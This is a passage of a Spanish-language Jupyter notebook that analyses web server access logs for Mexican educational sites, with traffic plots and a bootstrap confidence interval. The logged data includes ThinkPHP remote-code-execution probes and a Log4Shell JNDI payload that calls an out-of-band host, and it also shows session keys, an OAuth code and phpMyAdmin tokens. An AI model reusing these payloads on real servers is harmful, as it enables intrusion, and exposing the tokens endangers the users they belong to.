       "2  [[s, /admin/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
       "3    [[s, /api/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
       "4   [[s, /home/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
       "5   [[s, /user/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
       "6       [[s, //think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
       "7                         [[s, /index/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]   \n",
       "8                         [[s, /admin/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]   \n",
       "9                           [[s, /api/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]   \n",
       "\n",
       "  domain      fdate  dateunixtimest     ftime  fabstime           fdatetime  \n",
       "0        2023-06-27    1.687824e+09  07:12:12       7.2 2023-06-27 07:12:12  \n",
       "1        2023-06-27    1.687824e+09  07:12:12       7.2 2023-06-27 07:12:12  \n",
       "2        2023-06-27    1.687824e+09  07:12:13       7.2 2023-06-27 07:12:13  \n",
       "3        2023-06-27    1.687824e+09  07:12:14       7.2 2023-06-27 07:12:14  \n",
       "4        2023-06-27    1.687824e+09  07:12:14       7.2 2023-06-27 07:12:14  \n",
       "5        2023-06-27    1.687824e+09  07:12:15       7.2 2023-06-27 07:12:15  \n",
       "6        2023-06-27    1.687824e+09  07:12:15       7.2 2023-06-27 07:12:15  \n",
       "7        2023-06-27    1.687824e+09  07:12:16       7.2 2023-06-27 07:12:16  \n",
       "8        2023-06-27    1.687824e+09  07:12:16       7.2 2023-06-27 07:12:16  \n",
       "9        2023-06-27    1.687824e+09  07:12:16       7.2 2023-06-27 07:12:16  "
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head(10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "0c8c7227-f4be-4d33-a5f0-4119a3902185",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "remote_usr    [-, Jose, admin, Brenda, Cecilia, Maria, Yves,...\n",
      "http_ver                                   [HTTP/1.1, HTTP/1.0]\n",
      "dtype: object\n"
     ]
    }
   ],
   "source": [
    "cols_interest = [\"remote_usr\", \"http_ver\"]\n",
    "# Imprimimos los distintos valores que tiene cada columna\n",
    "print(pd.Series({col: df[col].unique() for col in cols_interest }))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "e9c6c8a8-8cb0-4a1f-8f09-f9200e1d5905",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['-', 'http://nextcloud-sader.designa.mx/wp-login.php',\n",
       "       'https://www.latinaer.org/about',\n",
       "       'https://www.latinaer.org/static/css/main.5f06e3a5.chunk.css',\n",
       "       'https://moodle.ucags.edu.mx/theme/styles.php/moove/1672684159_1610089734/all',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111342&forceview=1',\n",
       "       'https://moodle.ucags.edu.mx/login/index.php',\n",
       "       'https://accounts.google.com/',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2027',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2027&notifyeditingon=1',\n",
       "       'https://moodle.ucags.edu.mx/course/editsection.php?id=22323&sr',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?update=108201&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?id=108201&forceview=1',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=assign&type=&course=2027&section=6&return=0&sr=0',\n",
       "       'https://www.google.com/', 'http://localhost/',\n",
       "       'https://servicios.ieec.mx/maestros/estudiantes/detalle/198A0213',\n",
       "       'https://www.ieec.mx/posts/taller_medios',\n",
       "       'http://158.69.255.11:80/img/favico.png',\n",
       "       'http://158.69.255.11:80', 'http://158.69.255.11:80/favicon.ico',\n",
       "       'https://ojs.latinaer.org/',\n",
       "       'android-app://com.google.android.gm/',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=110245',\n",
       "       'https://moodle.ucags.edu.mx/theme/yui_combo.php?2in3/2.9.0/build/yui2-skin-sam-treeview/assets/skins/sam/yui2-skin-sam-treeview-min.css',\n",
       "       'https://moodle.ucags.edu.mx/',\n",
       "       'https://moodle.ucags.edu.mx/admin/oauth2callback.php?state=%2Fauth%2Foauth2%2Flogin.php%3Fwantsurl%3Dhttps%253A%252F%252Fmoodle.ucags.edu.mx%252Fmod%252Fassign%252Fview.php%253Fid%253D110245%26sesskey%3D33KQN4wBjA%26id%3D2&code=4%2F0AbUR2VPDe0AeIZmUREvaxeK69XZjODkb1FK_24eG74KWp6Z_TcjGRihJzi_m85SlSUFHkg&scope=email+profile+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&authuser=1&hd=alumnos.ucags.edu.mx&prompt=none',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=110603',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=110853',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111053',\n",
       "       'https://www.latinaer.org/',\n",
       "       'http://158.69.255.11:80/admin/login.asp',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111356&forceview=1',\n",
       "       'https://aprendizajes.ieec.mx/alumno/diagnostico/final',\n",
       "       'https://aprendizajes.ieec.mx/assets/index-74a0f7f0.css',\n",
       "       'https://latinaer.org/',\n",
       "       'https://latinaer.org/static/css/main.5f06e3a5.chunk.css',\n",
       "       'https://www.latinaer.org/editorial',\n",
       "       'https://www.latinaer.org/journal', 'www.brandimensions.com',\n",
       "       'https://ojs.latinaer.org/laer/article/view/130',\n",
       "       'https://ojs.latinaer.org/laer/$$$call$$$/page/page/css?name=font',\n",
       "       'https://ojs.latinaer.org/lib/pkp/styles/fontawesome/fontawesome.css?v=3.3.1.0',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/cuenta',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/aspirante',\n",
       "       'https://sii.upa.edu.mx/estilos/jquery.ui.theme.css',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/aspirante/citas',\n",
       "       'https://cdn.designa.mx/CREFAL/revistas-decisio/decisio42_resenas.pdf',\n",
       "       'www.google.com', 'https://sites.google.com/',\n",
       "       'https://ojs.latinaer.org/laer/article/view/76/50',\n",
       "       'https://ojs.latinaer.org/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=https%3A%2F%2Fojs.latinaer.org%2Flaer%2Farticle%2Fdownload%2F76%2F50%2F1082',\n",
       "       'https://ojs.latinaer.org/plugins/generic/pdfJsViewer/pdf.js/web/viewer.css',\n",
       "       'https://servicios.ieec.mx/tutores/login',\n",
       "       'https://ojs.latinaer.org/laer/authorDashboard/submission/202',\n",
       "       'https://ojs.latinaer.org/laer/submissions',\n",
       "       'https://servicios.ieec.mx/maestros/login',\n",
       "       'https://moodle.ucags.edu.mx/my/',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2036',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2036&section=7',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2036&notifyeditingon=1',\n",
       "       'http://reportesusmef.net/favicon.ico',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=assign&type=&course=2036&section=7&return=0&sr=0',\n",
       "       'http://cms.designa.mx/api/v1/edna_menu?q=%7B%22submenu%22:%22%22%7D&s=%7B%22order%22:1%7D',\n",
       "       'http://cms.designa.mx/api/v1/edna_menu?q=%7B%22submenu%22:%7B%22$ne%22:%22%22%7D%7D&s=%7B%22order%22:1%7D',\n",
       "       'http://cms.designa.mx/api/v1/edna_homecontent?t=findOne',\n",
       "       'http://cms.designa.mx/api/v1/edna_banners?q=%7B%22page%22:%22principal%22%7D&t=findOne',\n",
       "       'http://cms.designa.mx/api/v1/edna_events?s=%7B%22date%22:-1%7D&l=5',\n",
       "       '${jndi:ldap://${:-997}${:-861}.${hostName}.referer.ci8juj5b772feim6f1p0m16q6mkphfi65.oast.pro}',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1992&section=5',\n",
       "       'https://accounts.google.com.mx/',\n",
       "       'https://www.latinaer.org/uploads/_/originals/d85275bf-8055-4884-bf78-c50794d9bb30.pdf',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2012',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2012&section=6',\n",
       "       'https://intranet.upa.edu.mx/',\n",
       "       'https://ojs.latinaer.org/laer/announcement/view/2',\n",
       "       'https://intranet.upa.edu.mx/intra/acceso_i.php',\n",
       "       'https://intranet.upa.edu.mx/intra/validar_i.php',\n",
       "       'https://intranet.upa.edu.mx/index.php',\n",
       "       'https://intranet.upa.edu.mx/intra/menu_principal.php',\n",
       "       'https://intranet.upa.edu.mx/servicios/consultas/historial.php',\n",
       "       'https://intranet.upa.edu.mx/servicios/catalogos/alumnos.php',\n",
       "       'https://intranet.upa.edu.mx/upa.php/admision/citas',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=resource&type=&course=2036&section=7&return=0&sr=0',\n",
       "       'https://intranet.upa.edu.mx/upa.php/alumnos/citas_titulacion',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1981',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1981&section=4',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1981&section=5',\n",
       "       'https://pbr.upa.edu.mx/index.php/usuarios/login',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=label&type=&course=2036&section=7&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?update=111361&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?update=111359&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1995',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1995&section=6',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?id=107993',\n",
       "       'https://sii.upa.edu.mx/index.php', 'https://www.mindmeister.com/',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?f=21785',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2044',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=label&type=&course=2044&section=7&return=0&sr=0',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/',\n",
       "       'http://sis.cij.gob.mx/',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=assign&type=&course=2044&section=7&return=0&sr=0',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/index.php?token=ba6613be7e8cac48372b3c463653cdc9',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/navigation.php?token=ba6613be7e8cac48372b3c463653cdc9',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/main.php?token=ba6613be7e8cac48372b3c463653cdc9',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/phpmyadmin.css.php?token=ba6613be7e8cac48372b3c463653cdc9&js_frame=right&nocache=3879455035',\n",
       "       'https://intranet.upa.edu.mx/phpmyadmin/js/mooRainbow/mooRainbow.css',\n",
       "       'https://ieec.mx/cuadernillo-diagnostico/2',\n",
       "       'https://moodle.ucags.edu.mx/auth/oauth2/login.php?id=2&wantsurl=https%3A%2F%2Fmoodle.ucags.edu.mx%2F%3Fredirect%3D0&sesskey=SWHMzgdEwF',\n",
       "       'http://www.cide-edna.org',\n",
       "       'https://ojs.latinaer.org/laer/about/submissions',\n",
       "       'https://ojs.latinaer.org/laer/login',\n",
       "       'https://ojs.latinaer.org/laer/authorDashboard/submission/237',\n",
       "       'https://mx.search.yahoo.com/',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=url&type=&course=2044&section=7&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?id=107784',\n",
       "       'https://comunidadaprende.edu.mx/contacto/',\n",
       "       'https://servicios.ieec.mx/maestros/alumnos',\n",
       "       'https://servicios.ieec.mx/maestros/seguimiento',\n",
       "       'https://servicios.ieec.mx/static/css/main.76ec564e.chunk.css',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?f=21620',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/registro',\n",
       "       'https://sii.upa.edu.mx/estilos/breadcrumb.css',\n",
       "       'https://sii.upa.edu.mx/js/jquery-ui-1.10.1/jquery-ui.css',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2003',\n",
       "       'https://web.whatsapp.com/', 'http://ieec.mx/robots.txt',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=1882',\n",
       "       'http://cms.designa.mx/api/v1/edna_presentations?s=%7B%22date%22:-1%7D',\n",
       "       'http://cms.designa.mx/api/v1/edna_banners?q=%7B%22page%22:%22publicaciones%22%7D&t=findOne',\n",
       "       'https://www.comunidadaprende.edu.mx/favicon.ico',\n",
       "       'https://sii.upa.edu.mx/alumnos/acceso.php',\n",
       "       'http://cms.designa.mx/api/v1/edna_events?s=%7B%22date%22:-1%7D',\n",
       "       'http://cms.designa.mx/api/v1/edna_banners?q=%7B%22page%22:%22eventos%22%7D&t=findOne',\n",
       "       'https://aprendizajes.ieec.mx/alumno/ID',\n",
       "       'https://aprendizajes.ieec.mx/alumno/inicio-diagnostico',\n",
       "       'https://aprendizajes.ieec.mx/alumno/cuestionario/3',\n",
       "       'https://ojs.latinaer.org/laer/user/register',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=label&type=&course=2003&section=7&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=resource&type=&course=2003&section=7&return=0&sr=0',\n",
       "       'https://aprendizajes.ieec.mx/auth/logout',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2008',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2016',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2016&section=6',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2006',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2006&section=6',\n",
       "       'https://sii.upa.edu.mx/', 'https://www.ieec.mx/',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2013',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2013&section=6',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111302',\n",
       "       'https://sii.upa.edu.mx/alumnos/index.php',\n",
       "       'https://sii.upa.edu.mx/alumnos/validar.php',\n",
       "       'https://moodle.ucags.edu.mx/mod/forum/view.php?id=107441',\n",
       "       'https://ojs.latinaer.org/laer/article/view/4',\n",
       "       'https://sii.upa.edu.mx/upa.php/alumno/citas_titulacion/',\n",
       "       'https://moodle.ucags.edu.mx/course/view.php?id=2007',\n",
       "       'http://www.aguasvoyalcentro.com',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111299',\n",
       "       'https://moodle.ucags.edu.mx/course/modedit.php?add=url&type=&course=2003&section=7&return=0&sr=0',\n",
       "       'https://moodle.ucags.edu.mx/mod/assign/view.php?id=111181',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/registro/activar/czZxWHphS3R0ZTdWb1BUNFRORWZZU3V3cm5QN2JtdGRkMEpUV3Q3cXowS1NSbTZuZUpPeElrOUtLRzRzbTB3dFo0UW9VVEZDZFZTVi9LYklDbFlaTHc9PQ==',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/cuenta/recuperar',\n",
       "       'https://sii.upa.edu.mx/upa.php/admision/examen/generar_ficha'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"http_referer\"].head(3000).unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "0e0b2806-9bb1-4d94-9b23-2292416fc6f2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['27/Jun/2023', '20/Jun/2023', '21/Jun/2023', '13/Jun/2023',\n",
       "       '14/Jun/2023', '18/Jun/2023', '19/Jun/2023', '15/Jun/2023',\n",
       "       '16/Jun/2023', '25/Jun/2023', '17/Jun/2023', '24/Jun/2023',\n",
       "       '26/Jun/2023', '22/Jun/2023', '23/Jun/2023', '24/Mar/2023'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"date\"].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "1902dde2-538a-4c43-b50b-3517107bb06a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'23:59:59'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"time\"].max()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "7fd2747e-c8f7-4e96-b1d0-0d1ec9b5c529",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'00:00:00'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"time\"].min()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "508c6bf3-bec2-497e-9018-93810b0efe5b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "remote_addr                 object\n",
       "remote_usr                  object\n",
       "date_time                   object\n",
       "date                        object\n",
       "time                        object\n",
       "request                     object\n",
       "req_method                  object\n",
       "req_uri                     object\n",
       "http_ver                    object\n",
       "status                     float64\n",
       "body_bytes_sent            float64\n",
       "http_referer                object\n",
       "user_agent                  object\n",
       "dec_req_uri                 object\n",
       "clean_path                  object\n",
       "clean_query_list            object\n",
       "domain                      object\n",
       "fdate               datetime64[ns]\n",
       "dateunixtimest             float64\n",
       "ftime                       object\n",
       "fabstime                   float64\n",
       "fdatetime           datetime64[ns]\n",
       "dtype: object"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.dtypes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "57192477-1bcc-48f0-be32-22d106c70391",
   "metadata": {},
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "0b11a21a-b4db-485d-bc8e-c985b6b03f74",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = df.query(\"fdate > '2023-06-01'\").copy()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ced326b5-2435-4f40-abc7-ae7aca424cd4",
   "metadata": {},
   "source": [
    "## Distribución de valores"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "eceb0d7c-5d96-4f16-b0e0-3ef42a8cedf5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0, 0.5, 'Hora (normalizada)')"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x700 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [10, 7]\n",
    "plt.locator_params(axis='y', nbins=10)\n",
    "plt.scatter(df[\"fdate\"], df[\"fabstime\"])\n",
    "plt.title('Distribución de trafico por dia y hora')\n",
    "plt.xlabel('Fecha')\n",
    "plt.ylabel('Hora (normalizada)')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f8dd1649-108b-4c0f-9e03-864b16ca6e7e",
   "metadata": {},
   "source": [
    "Visualización de distribución de horas de tráfico, se nota una clara tendencia en horarios de trabajo y fines de semana."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b5a5c2a-3f6a-4275-ba2a-e722f4550538",
   "metadata": {},
   "outputs": [],
   "source": [
    "df['fdate'].value_counts().plot(title=\"Distribución de trafico total por dia\", xlabel=\"Fecha\", ylabel=\"Total de peticiones\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a34b56d5-2043-41f3-9d14-ee5dc67b68e6",
   "metadata": {},
   "source": [
    "# Bootstrap e intervalo de confianza"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "8c697d76-4036-4ed1-aa84-2768c18ff8e9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0, 0.5, 'Hora (normalizada)')"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x700 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [10, 7]\n",
    "plt.locator_params(axis='y', nbins=10)\n",
    "plt.scatter(df.query(\"domain == 'intranet.upa.edu.mx'\")[\"fdate\"], df.query(\"domain == 'intranet.upa.edu.mx'\")[\"fabstime\"])\n",
    "plt.title('Distribución de trafico en intranet.upa.edu.mx por dia y hora')\n",
    "plt.xlabel('Fecha')\n",
    "plt.ylabel('Hora (normalizada)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "aa8f1f0f-c981-4a11-b950-c3992011550e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: title={'center': 'Distribución de trafico total en intranet.upa.edu.mx por dia'}, xlabel='Fecha', ylabel='Total de peticiones'>"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x700 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "df['domain'] \\\n",
    "    .eq('intranet.upa.edu.mx') \\\n",
    "    .astype(int) \\\n",
    "    .groupby(df['fdate']) \\\n",
    "    .sum() \\\n",
    "    .plot(title=\"Distribución de trafico total en intranet.upa.edu.mx por dia\", xlabel=\"Fecha\", ylabel=\"Total de peticiones\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "a68fdf57-b92d-4fae-8dfe-b955a7378754",
   "metadata": {},
   "outputs": [],
   "source": [
    "freq_upa = df['domain'] \\\n",
    "    .eq('intranet.upa.edu.mx') \\\n",
    "    .astype(int) \\\n",
    "    .groupby(df['fdate']) \\\n",
    "    .sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "2d1b322f-7e2d-49ae-856e-c9c80c899cc4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "fdate\n",
       "2023-06-13    6510\n",
       "2023-06-14    5950\n",
       "2023-06-15    4699\n",
       "2023-06-16    4568\n",
       "2023-06-17      91\n",
       "2023-06-18      76\n",
       "2023-06-19    4690\n",
       "2023-06-20    6557\n",
       "2023-06-21    3156\n",
       "2023-06-22    3637\n",
       "2023-06-23    4382\n",
       "2023-06-24       0\n",
       "2023-06-25       0\n",
       "2023-06-26    4167\n",
       "2023-06-27    2652\n",
       "Name: domain, dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "freq_upa"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "1e2120ff-e2f0-48bf-bbcc-02876767dbc4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "6557"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "freq_upa.max()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "58c290da-57cd-4897-8691-ca975c2f053c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Min\n",
      "0\n",
      "Max\n",
      "6557\n",
      "Promedio\n",
      "3409.0\n",
      "Varianza\n",
      "5585859.857142857\n",
      "Desv Est\n",
      "2363.442374407055\n"
     ]
    }
   ],
   "source": [
    "print(\"Min\")\n",
    "print(freq_upa.min())\n",
    "print(\"Max\")\n",
    "print(freq_upa.max())\n",
    "print(\"Promedio\")\n",
    "print(freq_upa.mean())\n",
    "print(\"Varianza\")\n",
    "print(freq_upa.var())\n",
    "print(\"Desv Est\")\n",
    "print(freq_upa.std())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "d73e8858-8096-46dd-a2a0-4de75c8935a1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Nuestra muestra son los datos de la frecuencia de peticiones de la upa\n",
    "upa_sample_data = freq_upa.to_numpy()\n",
    "\n",
    "# Cantidad de submuestras a generar\n",
    "num_samples = 1000  \n",
    "\n",
    "# Lista para guardar los promedios generados (u otro estimador)\n",
    "freq_upa_bootstrap_means = []\n",
    "\n",
    "# Realizar remuestreo\n",
    "for _ in range(num_samples):\n",
    "    # Generamos submuestra con reemplazo\n",
    "    bootstrap_sample = np.random.choice(\n",
    "        upa_sample_data, \n",
    "        size=len(upa_sample_data), \n",
    "        replace=True)\n",
    "    # Calculamos el estimador puntual de interés y lo guardamos\n",
    "    freq_upa_bootstrap_means.append(np.mean(bootstrap_sample))\n",
    "\n",
    "# Calculate the confidence interval (using percentiles)\n",
    "upa_freq_confidence_interval = np.percentile(freq_upa_bootstrap_means, [2.5, 97.5])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7fc84b44-e8fd-4992-aafd-3a60910a5571",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([2268.47166667, 4533.23166667])"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "upa_freq_confidence_interval"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "4f7e74d5-6467-4c1f-871a-d90c8388aa9b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(0.0, 110.0)"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# An \"interface\" to matplotlib.axes.Axes.hist() method\n",
    "n, bins, patches = plt.hist(x=freq_upa_bootstrap_means, bins='auto', color='#0504aa',\n",
    "                            alpha=0.7, rwidth=0.85)\n",
    "plt.rcParams['figure.figsize'] = [10,8]\n",
    "plt.grid(axis='y', alpha=0.75)\n",
    "plt.xlabel('Valores remuestreados')\n",
    "plt.ylabel('Frecuencia')\n",
    "plt.title('Distribución de peticiones remuestreadas a intranet.upa.edu.mx al día')\n",
    "#plt.text(23, 45, r'$\\mu=15, b=3$')\n",
    "maxfreq = n.max()\n",
    "# Set a clean upper y-axis limit.\n",
    "plt.ylim(ymax=np.ceil(maxfreq / 10) * 10 if maxfreq % 10 else maxfreq + 10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "1e72471f-0d20-48af-887d-7ce993f9b13b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_5478/2252537124.py:2: FutureWarning: The behavior of 'isin' with dtype=datetime64[ns] and castable values (e.g. strings) is deprecated. In a future version, these will not be considered matching by isin. Explicitly cast to the appropriate dtype before calling isin instead.\n",
      "  df.query(\"fdate == '2023-06-25' and fabstime > 23\")[\"domain\"].unique()\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array(['moodle.ucags.edu.mx', 'mail.google.com', 'localhost', '',\n",
       "       'puntoderecarga.mx', 'accounts.google.com',\n",
       "       'com.google.android.gm', 'www.bing.com', 'servicios.ieec.mx',\n",
       "       'aprendizajes.ieec.mx', 'sii.upa.edu.mx', 'www.google.com',\n",
       "       'ieec.mx', 'ojs.latinaer.org', '158.69.255.11:80',\n",
       "       'ports.designa.mx', 'whatsapp-queue.designa.mx', 'repo.designa.mx',\n",
       "       'cms.designa.mx', 'com.google.android.googlequicksearchbox'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#df[\"fdate\"], df[\"fabstime\"])\n",
    "df.query(\"fdate == '2023-06-25' and fabstime > 23\")[\"domain\"].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8cc21a7d-4a12-4d3a-acf3-4707115d4bfd",
   "metadata": {},
   "source": [
